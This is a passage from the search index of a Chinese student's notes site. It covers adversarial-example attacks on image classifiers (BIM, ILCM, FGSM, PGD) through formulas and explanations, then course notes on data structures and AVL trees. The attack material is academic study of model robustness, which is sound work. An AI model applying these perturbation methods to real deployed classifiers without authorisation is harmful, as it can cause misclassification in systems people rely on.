\\(\\epsilon\\)</li> <li>\u57fa\u4e8e\u6b64\uff0c\u4f5c\u8005\u63d0\u51fa\u8fed\u4ee3\u5bfb\u627e\u5404\u4e2a\u50cf\u7d20\u70b9\u7684\u6270\u52a8\uff0c\u5373 I-FGSM or BIM\uff0c\u6bcf\u6b21\u8fed\u4ee3\u90fd\u5728\u4e0a\u4e00\u6b21\u8fed\u4ee3\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6270\u52a8\uff0c\u8fd9\u6837\u603b\u80fd\u7838\u5230\u8f83\u597d\u7684\u6b65\u8c03\u4f7f\u68af\u5ea6\u4e0a\u5347\uff0c\u6700\u5dee\u7684\u60c5\u51b5\u5c31\u662f\u8fed\u4ee3\u603b\u6539\u53d8\u91cf\u4e3a \\(\\epsilon\\)\uff0c\u8fd9\u6837\u5c31\u548c FGSM \u4e00\u6837</li> </ul> \\[ \\begin{matrix} &amp;\\boldsymbol{X}_0^{'} = \\boldsymbol{X} \\\\ &amp;\\boldsymbol{X}_{N+1}^{'} = Clip_{X, \\epsilon} \\{\\boldsymbol{X}_N^{'} + \\alpha \\cdot sign(\\nabla_X J(\\boldsymbol{\\theta}, \\boldsymbol{X}_N^{'}, y_{true}))\\} \\end{matrix} \\] <ul> <li>\\(\\boldsymbol{X}_{N+1}^{'}\\) \u662f\u7b2c \\(N+1\\) \u6b21\u8fed\u4ee3\u540e\u7684\u5f97\u5230\u7684\u5bf9\u6297\u6837\u672c</li> <li>\\(\\alpha\\): \u63a7\u5236\u6270\u52a8\u5927\u5c0f\u7684\u53c2\u6570</li> <li>\\(sign\\): \u7b26\u53f7\u51fd\u6570</li> <li>\\(J\\): \u635f\u5931\u51fd\u6570</li> <li>\\(\\boldsymbol{\\theta}\\): \u6a21\u578b\u53c2\u6570</li> <li>\\(y_{true}\\): \u6b63\u786e\u6807\u7b7e</li> <li> <p>\\(Clip\\): \u88c1\u526a\u51fd\u6570\uff0c\u5c06\u503c\u9650\u5236\u5728\u4e0d\u5927\u4e8e \\(\\epsilon\\) \u7684\u8303\u56f4\u5185</p> <ul> <li>\u5728\u8fed\u4ee3\u66f4\u65b0\u8fc7\u7a0b\u4e2d\uff0c\u968f\u8fed\u4ee3\u6b21\u6570\u589e\u52a0\uff0c\u90e8\u5206\u50cf\u7d20\u503c\u53ef\u80fd\u6ea2\u51fa\uff0c\u4f8b\u5982\u8d85\u51fa (0,1) \u7684\u8303\u56f4\uff0c\u6b64\u65f6\u9700\u8981\u8fdb\u884c\u88c1\u526a\uff0c\u5c06\u5176\u7528\u6700\u63a5\u8fd1\u7684\u503c\u4ee3\u66ff\uff0c\u4f8b\u5982\u8d85\u51fa 1 \u7684\u503c\u7528 1 \u4ee3\u66ff\uff0c\u8d85\u51fa 0 \u7684\u503c\u7528 0 \u4ee3\u66ff\u3002\u8fd9\u6837\u786e\u4fdd\u4e86\u65b0\u6837\u672c\u7684\u5404\u50cf\u7d20\u5728\u539f\u6837\u672c\u7684\u90bb\u57df\u5185\uff0c\u4f7f\u56fe\u50cf\u514d\u4e8e\u5931\u771f</li> <li>\u5176\u5177\u4f53\u516c\u5f0f\u5982\u4e0b (\\(\\boldsymbol{X}(x, y, z)\\) \u8868\u793a\u56fe\u50cf \\(X\\) \u5728\u5750\u6807 \\((x, y)\\) \u5904\u7684\u7b2c \\(z\\) \u4e2a\u901a\u9053\u7684\u50cf\u7d20\u503c)\uff1a</li> </ul> \\[Clip_{X, \\epsilon}\\{\\boldsymbol{X}^{'}\\}(x, y, z) = \\min \\{255, \\boldsymbol{X}(x, y, z) + \\epsilon, \\max \\{0, \\boldsymbol{X}(x, y, z) - \\epsilon, \\boldsymbol{X}^{'}(x, y, z)\\}\\}\\] </li> <li> <p>\u8fed\u4ee3\u7684\u542b\u4e49\uff1a\u6bcf\u6b21\u8fed\u4ee3\u90fd\u4f1a\u5728\u4e0a\u4e00\u6b21\u8fed\u4ee3\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6270\u52a8\uff0c\u5404\u4e2a\u50cf\u7d20\u6539\u53d8\u91cf\u4e3a \\(\\alpha\\), \u4e14\u6bcf\u6b21\u8fed\u4ee3\u90fd\u4f1a\u88c1\u526a\uff0c\u4fdd\u8bc1\u4e86\u65b0\u6837\u672c\u7684\u6270\u52a8\u4e0d\u4f1a\u8d85\u8fc7 \\(\\epsilon\\)</p> </li> </ul> code <p> Download bim_tutorial.ipynb</p>"}, {"location": "AI/Triviality/AdversarialAttack/BIM/#info-ilcm", "title": "Info-ILCM", "text": "<p>ICLM(Iterative Least-likely Class Method) \u7b97\u6cd5\u662f BIM \u7684\u4e00\u4e2a\u53d8\u79cd\uff0c\u5c06\u8f93\u5165\u56fe\u50cf\u5206\u7c7b\u5230\u6700\u4e0d\u53ef\u80fd\u7684\u7c7b\u522b</p> \\[ \\begin{matrix} &amp;\\boldsymbol{X}_0^{'} = \\boldsymbol{X} \\\\ &amp;\\boldsymbol{X}_{N+1}^{'} = Clip_{\\boldsymbol{X}, \\epsilon} \\{\\boldsymbol{X}_N^{'} - \\alpha \\cdot sign(\\nabla_X J(\\boldsymbol{\\theta}, \\boldsymbol{X}_N^{'}, y_{LL}))\\} \\end{matrix} \\] <ul> <li>\u7531\u516c\u5f0f\u53ef\u770b\u51fa\uff0c\u5176\u4e0e BIM \u7684\u533a\u522b\u662f \\(\\alpha\\) \u7684\u7b26\u53f7\u4e0d\u540c\uff0c\u5373 ILCM \u662f\u5728\u539f\u6837\u672c\u7684\u57fa\u7840\u4e0a\u51cf\u53bb\u68af\u5ea6\uff0c\u800c BIM \u662f\u5728\u539f\u6837\u672c\u7684\u57fa\u7840\u4e0a\u52a0\u4e0a\u68af\u5ea6</li> <li>\u540c\u65f6\u539f\u672c\u7684\u771f\u5b9e\u6807\u7b7e \\(y_{true}\\) \u88ab\u66ff\u6362\u4e3a\u6700\u4e0d\u53ef\u80fd\u7684\u6807\u7b7e \\(y_{LL}\\) (\u6b64\u4fee\u6539\u4f7f\u6a21\u578b\u4f18\u5316\u7684\u76ee\u6807\u662f\u6700\u7ec8\u5bf9\u5e94\u7c7b\u522b\u4e3a \\(y_{LL}\\) \u7684\u5206\u7c7b\u6807\u7b7e\u7684\u6982\u7387\u8d8a\u6765\u8d8a\u5927)</li> </ul> <p>\u8be5\u7b97\u6cd5\u548c\u5e38\u89c4\u5206\u7c7b\u6a21\u578b\u8bad\u7ec3\u7c7b\u4f3c\uff0c\u53ea\u662f\u76d1\u7763\u4fe1\u606f\u5e76\u4e0d\u662f\u771f\u5b9e\u6807\u7b7e\u4e86</p> <p>\u8be5\u7b97\u6cd5\u4e3b\u8981\u5728\u4e8e\u9009\u62e9 \\(y_{LL}\\)(\u539f\u8f93\u5165\u56fe\u50cf\u5728\u5206\u7c7b\u6a21\u578b\u4e2d\u5206\u7c7b\u6982\u7387\u6700\u5c0f\u7684\u7c7b\u522b), \u5176\u53ef\u7531\u4e00\u4e0b\u516c\u5f0f\u5f97\u5230\uff1a</p> \\[ y_{LL} = \\underset{y}{argmin} \\{p(y | \\boldsymbol{X})\\} \\] <ul> <li>\\(p(y | \\boldsymbol{X})\\) \u8868\u793a\u5728\u7ed9\u5b9a\u8f93\u5165 \\(\\boldsymbol{X}\\) \u7684\u60c5\u51b5\u4e0b\uff0c\u6a21\u578b\u9884\u6d4b\u4e3a \\(y\\) \u7684\u6982\u7387</li> </ul> <p>\u5b9e\u9a8c\u6548\u679c</p> <p></p> <p>\u7531\u4e0a\u56fe\u6240\u793a\uff1a\u5f53 \\(\\epsilon\\) \u8f83\u5c0f\u65f6\uff0cBIM \u6bd4\u539f\u59cb FGSM \u6548\u679c\u597d\u4e14 ICLM \u6548\u679c\u6700\u597d\u4e14 ICLM \u9700\u8981\u7684\u6270\u52a8\u91cf\u6700\u5c0f</p>"}, {"location": "AI/Triviality/AdversarialAttack/FGSM/", "title": "FGSM | Fast Gradient Sign Method", "text": "<p> \u7ea6 790 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Paper</p> <p>\u8bba\u6587\u5730\u5740</p> <p>\u7279\u70b9</p> <ul> <li>\u57fa\u4e8e\u68af\u5ea6\u7684\u653b\u51fb\u65b9\u6cd5</li> <li>\u65e0\u76ee\u6807\u653b\u51fb</li> <li>\u65e0\u7a77\u8303\u6570\u653b\u51fb</li> <li>\u767d\u76d2\u653b\u51fb</li> </ul>"}, {"location": "AI/Triviality/AdversarialAttack/FGSM/#_1", "title": "\u5f15\u8a00", "text": "<p>Explaining And Harnessing Adversarial Examples \u4e3b\u8981\u63d0\u51fa\u5bf9\u4e8e\u5bf9\u6297\u6837\u672c\u5b58\u5728\u539f\u56e0\u7684\u4e00\u79cd\u65b0\u89e3\u91ca\uff0c\u5373\u795e\u7ecf\u7f51\u7edc\u7684\u7ebf\u6027\u7279\u6027\uff0c\u5e76\u63d0\u51fa\u4e86\u5feb\u901f\u6709\u6548\u751f\u6210\u5bf9\u6297\u6837\u672c\u7684\u65b9\u6cd5\uff0c\u5373 FGSM</p>"}, {"location": "AI/Triviality/AdversarialAttack/FGSM/#_2", "title": "\u7ebf\u6027\u6a21\u578b\u7684\u5bf9\u6297\u6837\u672c", "text": "<ul> <li>\u5728\u8bb8\u591a\u95ee\u9898\u4e2d\uff0c\u5355\u4e2a\u8f93\u5165\u7279\u5f81\u7684\u7cbe\u5ea6\u662f\u6709\u9650\u7684\u3002\u4f8b\u5982\uff0c\u6570\u5b57\u56fe\u50cf\u901a\u5e38\u6bcf\u50cf\u7d20\u53ea\u4f7f\u75288\u4f4d\uff0c\u5373\u6bcf\u4e2a\u50cf\u7d20\u7684\u4eae\u5ea6\u503c\u5728 0 \u5230 255 \u4e4b\u95f4\u53d8\u5316\uff0c\u56e0\u6b64\u4ed6\u4eec\u4e22\u5f03\u52a8\u6001\u8303\u56f4 1/255<sup>1</sup> \u7684\u6240\u6709\u4fe1\u606f\u3002</li> <li>\u6545\u800c\uff0c\u5f53\u6270\u52a8 \\(\\boldsymbol{\\eta}\\) \u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u5c0f\u4e8e\u6700\u5c0f\u7cbe\u5ea6\u65f6\uff0c\u7406\u8bba\u4e0a\u5bf9\u4e00\u4e2a\u7c7b\u522b\u5206\u79bb\u826f\u597d\u7684\u95ee\u9898\uff0c\u5206\u7c7b\u5668\u5e94\u5bf9 \\(\\boldsymbol{\\tilde{x}} = \\boldsymbol{x} + \\boldsymbol{\\eta}\\) \u548c \\(\\boldsymbol{x}\\) \u5206\u914d\u76f8\u540c\u7c7b\u522b\uff0c\u5373 \\(||\\boldsymbol{\\eta}||_{\\infty} &lt; \\epsilon\\), \u5176\u4e2d \\(\\epsilon\\) \u8db3\u591f\u5c0f\uff0c\u53ef\u88ab\u4e0e\u6211\u4eec\u95ee\u9898\u76f8\u5173\u8054\u7684\u4f20\u611f\u5668\u6216\u6570\u636e\u5b58\u50a8\u8bbe\u5907\u4e22\u5f03</li> </ul> \\[ \\boldsymbol{w}^T \\tilde{\\boldsymbol{x}} = \\boldsymbol{w}^T \\boldsymbol{x} + \\boldsymbol{w}^T \\boldsymbol{\\eta} \\] <ul> <li>\\(\\boldsymbol{w}\\)\uff1a\u6a21\u578b\u7684\u6743\u91cd\u53c2\u6570</li> <li>\\(\\tilde{\\boldsymbol{x}}\\)\uff1a\u4ee3\u8868\u4e00\u4e2a\u751f\u6210\u7684\u5bf9\u6297\u6837\u672c</li> <li>\\(\\boldsymbol{x}\\)\uff1a\u539f\u59cb\u6837\u672c</li> <li> <p>\\(\\boldsymbol{\\eta}\\)\uff1a\u4ee3\u8868\u5728\u6b63\u5e38\u6837\u672c\u4e0a\u6dfb\u52a0\u7684\u6270\u52a8\uff0c\u5176\u4e2d\u6270\u52a8\u5411\u91cf\u4e2d\u6bcf\u4e00\u5143\u7d20\u7684\u6570\u503c\u7edd\u5bf9\u503c\u5927\u5c0f\u90fd\u4e0d\u8d85\u8fc7 \\(\\epsilon\\)</p> </li> <li> <p>\u5bf9\u6297\u6027\u6270\u52a8\u4f1a\u5bfc\u81f4\u6fc0\u6d3b\u589e\u957f \\(\\boldsymbol{w}^T \\boldsymbol{\\eta}\\), \u901a\u8fc7\u8d4b\u4e88 \\(\\boldsymbol{\\eta} = \\epsilon sign(\\boldsymbol{w})\\)\uff0c\u53ef\u4ee5\u5728 \\(\\boldsymbol{\\eta}\\) \u4e0a\u53d7\u5230\u6700\u5927\u8303\u6570\u7ea6\u675f\u7684\u60c5\u51b5\u4e0b\u6700\u5927\u5316\u6b64\u589e\u91cf\u3002\u82e5 \\(\\boldsymbol{w}\\) \u6709 \\(n\\) \u4e2a\u7ef4\u5ea6\u4e14\u6743\u91cd\u5411\u91cf\u7684\u5143\u7d20\u7684\u5e73\u5747\u5927\u5c0f\u4e3a \\(m\\)\uff0c\u5219\u6fc0\u6d3b\u5c06\u4ee5 \\(\\epsilon n m\\) \u589e\u957f</p> </li> <li>\u540c\u65f6\uff0c\\(||\\boldsymbol{\\eta}||_{\\infty}\\) \u4e0d\u968f \\(n\\) \u800c\u589e\u957f\uff0c\u4f46\u6270\u52a8\u5f15\u8d77\u7684\u6fc0\u6d3b\u589e\u957f\u5374\u968f \\(n\\) \u800c\u589e\u957f\uff0c\u6545\u800c\u5f53 \\(n\\) \u8db3\u591f\u5927\u65f6\uff0c\u5373\u4f7f\u6270\u52a8\u7684\u6700\u5927\u8303\u6570\u5f88\u5c0f\uff0c\u4e5f\u80fd\u5bf9\u6a21\u578b\u7684\u8f93\u51fa\u9020\u6210\u5f88\u5927\u7684\u5f71\u54cd</li> <li>\u7531\u6b64\uff0c\u5bf9\u4e8e\u9ad8\u7ef4\u95ee\u9898\uff0c\u53ef\u4ee5\u5bf9\u8f93\u5165\u505a\u8bb8\u591a\u65e0\u7a77\u5c0f\u7684\u6270\u52a8\uff0c\u4ece\u800c\u4f7f\u6a21\u578b\u7684\u8f93\u51fa\u53d1\u751f\u8f83\u5927\u7684\u53d8\u5316\u3002</li> </ul> <p>\u8fd9\u8868\u660e\uff0c\u5982\u679c\u4e00\u4e2a\u7b80\u5355\u7684\u7ebf\u6027\u6a21\u578b\u7684\u8f93\u5165\u5177\u6709\u8db3\u591f\u7684\u7ef4\u6570\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u6709\u5bf9\u6297\u6837\u672c</p>"}, {"location": "AI/Triviality/AdversarialAttack/FGSM/#_3", "title": "\u975e\u7ebf\u6027\u6a21\u578b\u7684\u7ebf\u6027\u6270\u52a8", "text": "<ul> <li>\u4e0a\u8ff0\u5173\u4e8e\u7ebf\u6027\u6a21\u578b\u7684\u5bf9\u6297\u6837\u672c\u7684\u5206\u6790\u7ed9\u51fa\u4e86\u4e00\u79cd\u5feb\u901f\u751f\u6210\u5bf9\u6297\u6837\u672c\u7684\u601d\u8def\u3002</li> <li>\u5047\u8bbe\u795e\u7ecf\u7f51\u7edc\u592a\u7ebf\u6027\u800c\u65e0\u6cd5\u5bf9\u6297\u7ebf\u6027\u6270\u52a8\uff0cLSTM\uff0cReLU \u548c maxout \u7f51\u7edc\u7b49\u90fd\u88ab\u8bbe\u8ba1\u4e3a\u4ee5\u4e00\u79cd\u5f88\u7ebf\u6027\u7684\u65b9\u5f0f\u8fd0\u884c\u4ee5\u4fbf\u4e8e\u4f18\u5316\u3002\u51fa\u4e8e\u540c\u6837\u7684\u539f\u56e0\uff0c\u66f4\u591a\u7684\u975e\u7ebf\u6027\u6a21\u578b\uff0c\u5982 Sigmoid \u7f51\u7edc\u4e5f\u88ab\u4ed4\u7ec6\u8c03\u6574\uff0c\u4f7f\u5176\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u975e\u9971\u548c\u3001\u66f4\u7ebf\u6027\u7684\u72b6\u6001\u4e0a\u3002\u8fd9\u79cd\u7ebf\u6027\u884c\u4e3a\u8868\u660e\uff0c\u7ebf\u6027\u6a21\u578b\u7684\u8fd9\u79cd\u5ec9\u4ef7\u7684\u3001\u5206\u6790\u6027\u7684\u6270\u52a8\u4e5f\u80fd\u7834\u574f\u795e\u7ecf\u7f51\u7edc</li> <li>\u7531\u6b64\u5f15\u5165\u672c\u7bc7\u91cd\u70b9 \u2014\u2014 FGSM</li> </ul>"}, {"location": "AI/Triviality/AdversarialAttack/FGSM/#fgsm", "title": "FGSM", "text": "<ul> <li>\u56e0\u4e3a\u767d\u76d2\u653b\u51fb\u5df2\u77e5\u6a21\u578b\u7684\u5185\u90e8\u7ed3\u6784\u548c\u53c2\u6570\uff0c\u6545\u6700\u6709\u6548\u7684\u767d\u76d2\u653b\u51fb\u7b97\u6cd5\u5373\u662f\u5bf9\u6a21\u578b\u8f93\u5165\u7684\u68af\u5ea6\u8fdb\u884c\u6709\u9650\u6270\u52a8\uff0c\u4f7f\u6270\u52a8\u540e\u7684\u635f\u5931\u51fd\u6570\u503c\u6700\u5927\u5316\uff0c\u4ece\u800c\u4f7f\u6a21\u578b\u7684\u8f93\u51fa\u53d1\u751f\u6539\u53d8</li> <li>\u5728\u8bbe\u8ba1\u795e\u7ecf\u7f51\u7edc\u65f6\uff0c\u4f1a\u4f7f\u7528\u68af\u5ea6\u4e0b\u964d\u6cd5\u4f7f gradient \u6700\u5c0f\uff0c\u800c\u5bf9\u6297\u653b\u51fb\u76f8\u53cd\uff0cFGSM \u4f7f\u68af\u5ea6\u4e0a\u5347\uff0c\u4f7f\u5f97\u635f\u5931\u51fd\u6570\u6700\u5927\u5316</li> </ul> <p>\u5177\u4f53\u8bb2\uff0cFGSM \u662f\u5728\u767d\u76d2\u73af\u5883\u4e0b\uff0c\u901a\u8fc7\u6c42\u51fa\u6a21\u578b\u5bf9\u8f93\u5165\u7684\u5bfc\u6570\uff0c\u7136\u540e\u7528\u7b26\u53f7\u51fd\u6570\u5f97\u5230\u5177\u4f53\u7684\u68af\u5ea6\u65b9\u5411\uff0c\u63a5\u7740\u4e58\u4e0a\u4e00\u4e2a\u6b65\u957f\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u6270\u52a8\u503c\uff0c\u6700\u540e\u5c06\u6270\u52a8\u503c\u52a0\u5230\u539f\u59cb\u8f93\u5165\u4e0a\uff0c\u5f97\u5230\u5bf9\u6297\u6837\u672c\uff0c\u5982\uff1a (\u6570\u5b66\u8868\u8fbe\u5982\u4e0b)\uff1a</p> \\[ \\boldsymbol{x}^{'} = \\boldsymbol{x} + \\epsilon \\cdot sign(\\nabla_x J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y)) \\] <ul> <li>\\(\\boldsymbol{x}\\)\uff1a\u539f\u59cb\u6837\u672c</li> <li>\\(\\boldsymbol{x}^{'}\\)\uff1a\u5bf9\u6297\u6837\u672c</li> <li>\\(\\epsilon\\)\uff1a\u6270\u52a8\u503c\uff0c\u4e00\u65e6\u8d85\u51fa\u9608\u503c\uff0c\u8be5\u5bf9\u6297\u6837\u672c\u4f1a\u88ab\u4eba\u773c\u8bc6\u522b\u51fa\u6765</li> <li>\\(\\boldsymbol{\\theta}\\): \u6a21\u578b\u7684\u6743\u91cd\u53c2\u6570</li> <li>\\(J\\): \u635f\u5931\u51fd\u6570</li> <li>\\(y\\): \u771f\u5b9e\u6807\u7b7e</li> <li>\\(\\nabla_x\\): \u8868\u793a\u5bf9 \\(x\\) \u6c42\u504f\u5bfc</li> <li>\u6211\u4eec\u53ef\u4ee5\u56f4\u7ed5 \\(\\boldsymbol{\\theta}\\) \u7684\u5f53\u524d\u503c\u6765\u7ebf\u6027\u5316\u635f\u5931\u51fd\u6570\uff0c\u4ee5\u83b7\u5f97 \\(\\epsilon \\cdot sign(\\nabla_x J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y))\\) \u7684 optimal max-norm constrained perturbation(\u6700\u4f18\u7684\u6700\u5927\u8303\u6570\u7ea6\u675f\u6270\u52a8)\uff0c\u5c06\u5176\u79f0\u4e3a\u751f\u6210\u5bf9\u6297\u6837\u672c\u7684\u201c\u5feb\u901f\u68af\u5ea6\u7b26\u53f7\u6cd5\u201d \uff08FGSM\uff09</li> </ul>"}, {"location": "AI/Triviality/AdversarialAttack/FGSM/#implementation", "title": "Implementation", "text": "<p>Pytorch \u5b9e\u73b0</p> <p> Download fgsm_tutorial.ipynb</p> <ol> <li> <p>\u5f53\u6211\u4eec\u8c08\u8bba\u52a8\u6001\u8303\u56f41/255\u65f6\uff0c\u6211\u4eec\u662f\u5728\u8ba8\u8bba\u8fd9\u4e2a\u6700\u5c0f\u53d8\u5316\u91cf1\u76f8\u5bf9\u4e8e\u6574\u4e2a\u53ef\u80fd\u7684\u4eae\u5ea6\u8303\u56f4\uff080\u5230255\uff09\u7684\u6bd4\u4f8b\u3002\u6240\u4ee5\uff0c1/255\u662f\u8868\u793a\u57288\u4f4d\u56fe\u50cf\u4e2d\uff0c\u6700\u5c0f\u7684\u4eae\u5ea6\u53d8\u5316\u91cf\u5360\u603b\u4eae\u5ea6\u8303\u56f4\u7684\u6bd4\u4f8b\u00a0\u21a9</p> </li> </ol>"}, {"location": "AI/Triviality/AdversarialAttack/PGD/", "title": "PGD | Project Gradient Descent", "text": "<p> \u7ea6 354 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Paper</p> <p>\u8bba\u6587\u5730\u5740</p> <p>\u8bba\u6587\u629b\u51fa\u7684\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ol> <li>\u5982\u4f55\u751f\u6210\u5f3a\u5bf9\u6297\u6837\u672c\uff1f\u5373\u8f83\u5c0f\u7684\u6270\u52a8\u5373\u53ef\u4f7f\u6a21\u578b\u5206\u7c7b\u9519\u8bef\u7684\u6837\u672c</li> <li>\u5982\u4f55\u8bad\u7ec3\u4e00\u4e2a\u9c81\u68d2\u6027\u5f3a\u7684\u6a21\u578b\uff1f</li> </ol> <p>Info</p> <p>\u8bba\u6587\u4e2d\u63d0\u5230\uff1aPGD \u662f\u6700\u5f3a\u7684\u4e00\u9636\u653b\u51fb. </p> <ul> <li>\u901a\u8fc7 PGD \u53d1\u73b0\u7684\u5c40\u90e8\u6700\u5927\u503c\u5728\u6b63\u5e38\u8bad\u7ec3\u7684\u7f51\u7edc\u548c\u5bf9\u6297\u8bad\u7ec3\u7684\u7f51\u7edc\u4e2d\u90fd\u6709\u7740\u76f8\u4f3c\u7684\u635f\u5931\u503c\uff1b</li> <li>\u5373 PGD \u8bad\u7ec3\u5bf9\u6297\u6837\u672c\uff0c\u548c\u666e\u901a\u7f51\u7edc\u8bad\u7ec3\u5e72\u51c0\u6837\u672c\u7684\u635f\u5931\u662f\u7c7b\u4f3c\u7684\uff1b</li> <li>\u5373\u53ea\u8981\u80fd\u591f\u9632\u5fa1\u4f4f PGD\uff0c\u5c31\u4f1a\u5bf9\u6240\u6709\u7684\u4e00\u9636\u653b\u51fb\u5177\u6709\u9c81\u68d2\u6027</li> </ul>"}, {"location": "AI/Triviality/AdversarialAttack/PGD/#quick-start", "title": "Quick Start", "text": "<p>\u516c\u5f0f\uff1a</p> \\[ X^{N+1} = \\Pi_{X+S}(X^N + \\alpha \\cdot sign(\\nabla_X J(\\theta, X^N, y_{true}))) \\] <ul> <li>\\(X\\): \u539f\u59cb\u6837\u672c</li> <li>\\(X^{N+1}\\)\uff1a\u7b2c \\(N+1\\) \u6b21\u8fed\u4ee3\u7684\u6837\u672c</li> <li>\\(\\Pi_{X+S}\\): \u6295\u5f71\u51fd\u6570\uff0c\u5c06\u503c\u6295\u5f71\u5230 \\(X+S\\) \u7684 \\(\\epsilon\\) \u90bb\u57df\u5185</li> <li>\\(S\\): \u968f\u673a\u566a\u58f0</li> <li>\\(\\alpha\\): \u63a7\u5236\u6270\u52a8\u5927\u5c0f\u7684\u53c2\u6570</li> <li>\\(J\\): \u635f\u5931\u51fd\u6570</li> <li>\\(\\theta\\): \u6a21\u578b\u53c2\u6570</li> <li>\\(y_{true}\\): \u771f\u5b9e\u6807\u7b7e</li> <li>\\(sign\\): \u7b26\u53f7\u51fd\u6570</li> </ul> <p>PGD &amp; BIM \u4e3b\u8981\u533a\u522b</p> <ul> <li>PGD \u4f7f\u7528\u6295\u5f71\u51fd\u6570\u4f7f\u5f97\u5bf9\u6297\u6837\u672c\u4e0e\u539f\u59cb\u6837\u672c\u6bcf\u4e2a\u70b9\u7684\u50cf\u7d20\u503c\u5dee\u8ddd\u4e0d\u5927\u4e8e \\(\\epsilon\\)\uff0c\u800c BIM \u5219\u662f\u4f7f\u7528\u88c1\u526a\u51fd\u6570\u4f7f\u5f97\u5bf9\u6297\u6837\u672c\u4e0e\u539f\u59cb\u6837\u672c\u6bcf\u4e2a\u70b9\u7684\u50cf\u7d20\u503c\u5dee\u8ddd\u4e0d\u5927\u4e8e \\(\\epsilon\\)</li> <li>PGD \u4f1a\u5728\u5bf9\u6297\u6837\u672c\u653b\u51fb\u524d\u5728\u6837\u672c\u4e2d\u968f\u673a\u6dfb\u52a0\u566a\u58f0</li> </ul> Pytorch \u5b9e\u73b0 <p> Download PGD.ipynb Here</p>"}, {"location": "AI/Triviality/AdversarialAttack/PGD/#more-details", "title": "More Details", "text": "<p>To Be Continued</p>"}, {"location": "Course/abstract/", "title": "ZJU - COURSES", "text": "<p> \u7ea6 111 \u4e2a\u5b57 </p> <p>Abstarct</p> <p>\\(\u8fd9\u91cc\u5b58\u7740\u82ef\u4eba\u5728  ~~ ZJU ~~ \u4e0a\u8fc7\u7684\u4e00\u4e9b\u8bfe\u7a0b\u7b14\u8bb0\\) </p> List <ul> <li>\u5927\u4e8c\u4e0a: <ul> <li> \u8ba1\u7b97\u673a\u7cfb\u7edf\u2161 | SYS2</li> <li> \u6570\u636e\u7ed3\u6784\u57fa\u7840 | FDS</li> </ul> </li> <li>\u5927\u4e8c\u4e0b<ul> <li> \u8ba1\u7b97\u673a\u7cfb\u7edf\u2162 | SYS3</li> <li> \u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790 | ADS</li> <li> \u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1 | OOP </li> </ul> </li> <li>\u5927\u4e09\u4e0a <ul> <li> \u8ba1\u7b97\u673a\u52a8\u753b </li> </ul> </li> <li>\u5927\u4e09\u4e0b<ul> <li> \u7f51\u7edc\u5b89\u5168\u539f\u7406\u4e0e\u5b9e\u8df5</li> <li> \u7f16\u8bd1\u539f\u7406</li> </ul> </li> </ul> <p>Attention</p> <ul> <li>\u7b14\u8bb0\u672a\u5b8c\u6210\u7684\u90e8\u5206\u4f1a\u52a0\u5bc6 </li> </ul>"}, {"location": "Course/ADS/", "title": "\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790", "text": "<p> \u7ea6 114 \u4e2a\u5b57 </p> <p>Abstract</p> <p>ZJU - ADS (\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790), \u627f\u63a5 FDS \u8bfe\u7a0b\u5185\u5bb9\u4e3b\u8981\u5305\u62ec:</p> <ul> <li>Data Structures<ul> <li>Balanced Search Trees: AVL Tree, Splay Tree, B++ Tree, Read-Black Tree</li> <li>Leftist Heaps, Skew Heaps, Binomial Queue</li> <li>\u00b7\u00b7\u00b7</li> </ul> </li> <li>Algorithms (Key Points)<ul> <li>Divide and Conquer</li> <li>Backtracking, Dynamic Programming</li> <li>Greedy Algorithms, Local Search</li> <li>NP-Completeness, Approximation Algorithm</li> <li>Randomiazed Algorithms, Parallel Algorithms</li> <li>External Sorting</li> <li>\u00b7\u00b7\u00b7</li> </ul> </li> </ul> Acknowledgement <p>ZJU - ADS \u8bfe\u7a0b\u7ec4</p> <p>\u7b14\u8bb0\u4e2d\u90e8\u5206\u9ec4\u5e95\u56fe\u7247\u6458\u81ea ZJU-ADS \u8bfe\u7a0b PPT \u4e2d</p> <p>\u6ca1\u5199\u5b8c\u7684\u7b14\u8bb0\u5c31\u884c\u52a0\u5bc6\u4e86</p> <p>To Be Continued</p>"}, {"location": "Course/ADS/Lec01/", "title": "AVL &amp; Splay &amp; Amortized Analysis", "text": "<p> \u7ea6 1529 \u4e2a\u5b57  7 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"}, {"location": "Course/ADS/Lec01/#avl-trees", "title": "AVL Trees", "text": "<p>\u4e5f\u53ef\u79f0\u4e3a Blanced Binary Search Trees (BBST) | AVL (Adelson-Velsky and Landis) Trees</p> <p>Definitions</p> <ul> <li>An empty binary tree is height balanced. If \\(T\\) is a nonempty binary tree with \\(T_L\\) and \\(T_R\\) as its left and right subtrees, then \\(T\\) is height balanced if<ol> <li>\\(T_L\\) and \\(T_R\\) are height balanced, and</li> <li>\\(| h_L - h_R | \\le 1\\) where \\(h_L\\) and \\(h_R\\) are heights of \\(T_L\\) and \\(T_R\\) </li> </ol> </li> <li>The balanced factor \\(BF\\) (node) = \\(h_L - h_R\\). In an AVL tree, \\(BF\\) (node) = -1, 0, or 1</li> </ul>"}, {"location": "Course/ADS/Lec01/#maximum-height", "title": "Maximum Height", "text": "<ul> <li>Let \\(n_h\\) be the minimum number of nodes in a balanced binary tree with height \\(h\\)<ul> <li>\u7ed3\u70b9\u6570\u6700\u5c0f\u65f6:  </li> <li>In genernal ( \\(n_h = n_{h-1} + n_{h-2} + 1\\) ):  <ul> <li>Cause Fibonacci sequence: \\(F_0 = 1, ~ F_1 = 1, ~ F_i = F_{i-1} + F_{i-2}\\) for \\(i &gt; 1\\)</li> <li>\\(n_h = 